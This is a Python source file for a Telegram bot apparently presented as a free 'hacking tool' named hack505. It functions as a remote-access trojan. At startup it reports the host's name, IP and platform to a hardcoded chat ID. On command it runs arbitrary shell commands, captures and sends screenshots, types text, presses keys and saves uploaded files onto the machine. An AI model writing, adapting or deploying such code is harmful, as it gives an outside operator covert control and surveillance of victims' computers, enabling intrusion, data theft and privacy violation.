import telegram.ext
import pyautogui
import datetime
import os
import subprocess
import random
import socket
import platform

with open('token.txt', 'r') as f:
    TOKEN = f.read()


def system_info(context):
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    plat = platform.processor()
    system = platform.system()
    machine = platform.machine()

    info_string = (
        f"System Information:\n\n"
        f"Hostname: {hostname}\n"
        f"IP Address: {ip}\n"
        f"Processor: {plat}\n"
        f"System: {system}\n"
        f"Machine: {machine}")

    # Replace 'YOUR_CHAT_ID' with the actual chat ID where you want to send the message
    context.bot.send_message(chat_id='5118057698', text=info_string)
    # update.message.reply_text(info_string)


def yo(update, context):
    greetings = [
        "Hello!",
        "Hi there!",
        "Greetings!",
        "Hey!",
        "Welcome!",
        "Good day!",
        "Nice to see you!"]

    update.message.reply_text(f"{random.choice(greetings)}")


def take_screenshot():
    # Naming file as time
    current_time = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    # Take a screenshot and save it
    screenshot = pyautogui.screenshot()
    screenshot.save(f"{current_time}.png")
    return f"{current_time}.png"


def start(update, context):
    update.message.reply_text("Hello! welcoming you to hack505!")


def help(update, context):
    update.message.reply_text("""
/start
/content
/jarvis
/screen                                                            
""")


def content(update, context):
    update.message.reply_text(
        "here you can find the ulimate hacking tool for free of cost!")


def screenshot(update, context):
    try:
        image_path = take_screenshot()
        update.message.reply_photo(photo=open(image_path, 'rb'))
    except Exception as e:
        update.message.reply_text(f"Error: {e}")


def kamesh(update, context):
    update.message.reply_text(
        "my name is kamesh")


def handle_text(update, context):
    try:
        user_text = update.message.text

        if user_text == "$mouse":
            update.message.reply_text(str(pyautogui.position()))

        # Check if the message starts with the /type command
        elif user_text.startswith('$type'):
            # Extract the text after the /type command
            text_to_type = user_text[len('$type'):].strip()
            if text_to_type:
                pyautogui.write(text_to_type)
            else:
                update.message.reply_text(
                    "Please provide text after the /type command.")

    except Exception as e:
        update.message.reply_text(f"Error: {e}")


def run_command(update, context):
    # Get the command from the user's message
    command = update.message.text[len('/jarvis '):]

    try:
        # Execute the command using subprocess
        result = subprocess.check_output(command, shell=True, text=True)
        update.message.reply_text(f"Command executed successfully:\n{result}")
    except subprocess.CalledProcessError as e:
        update.message.reply_text(f"Error executing command:\n{e}")


def download_file(update, context):
    # Get the file ID from the message
    file_id = update.message.document.file_id

    # Get information about the file
    file_info = context.bot.get_file(file_id)

    # Download the file
    file_path = file_info.download()

    update.message.reply_text(
        f"File downloaded successfully. Path: {file_path}")


def press_key(update, context):
    try:
        # Extract the key combination after the /presskey command
        key_combination = update.message.text[len('/presskey'):].strip()
        if key_combination:
            pyautogui.hotkey(*key_combination.split())
        else:
            update.message.reply_text(
                "Please provide a key combination after the /presskey command.")
    except Exception as e:
        update.message.reply_text(f"Error: {e}")


def arrow_key(update, context):
    try:
        # Extract the arrow key command
        arrow_command = update.message.text[len('/arrow '):].strip()

        # Map arrow commands to corresponding keys
        arrow_keys = {
            'up': 'up',
            'down': 'down',
            'left': 'left',
            'right': 'right',
        }

        # Check if the arrow command is valid
        if arrow_command in arrow_keys:
            pyautogui.hotkey(arrow_keys[arrow_command])
        else:
            update.message.reply_text("Invalid arrow key command.")
    except Exception as e:
        update.message.reply_text(f"Error: {e}")


updater = telegram.ext.Updater(TOKEN, use_context=True)
disp = updater.dispatcher

disp.add_handler(telegram.ext.CommandHandler('start', start))
disp.add_handler(telegram.ext.CommandHandler("help", help))
disp.add_handler(telegram.ext.CommandHandler("content", content))
disp.add_handler(telegram.ext.CommandHandler("kamesh", kamesh))
# Add the new command handler
disp.add_handler(telegram.ext.CommandHandler("screen", screenshot))
disp.add_handler(telegram.ext.MessageHandler(
    telegram.ext.Filters.text, handle_text))
disp.add_handler(telegram.ext.CommandHandler('jarvis', run_command))
disp.add_handler(telegram.ext.MessageHandler(
    telegram.ext.Filters.document, download_file))
disp.add_handler(telegram.ext.CommandHandler("yo", yo))
disp.add_handler(telegram.ext.CommandHandler("presskey", press_key))
disp.add_handler(telegram.ext.MessageHandler(
    telegram.ext.Filters.regex(r'^/arrow\s'), arrow_key))
disp.add_handler(telegram.ext.CommandHandler("sys", system_info))

updater.job_queue.run_once(system_info, 0)

updater.start_polling()
updater.idle()
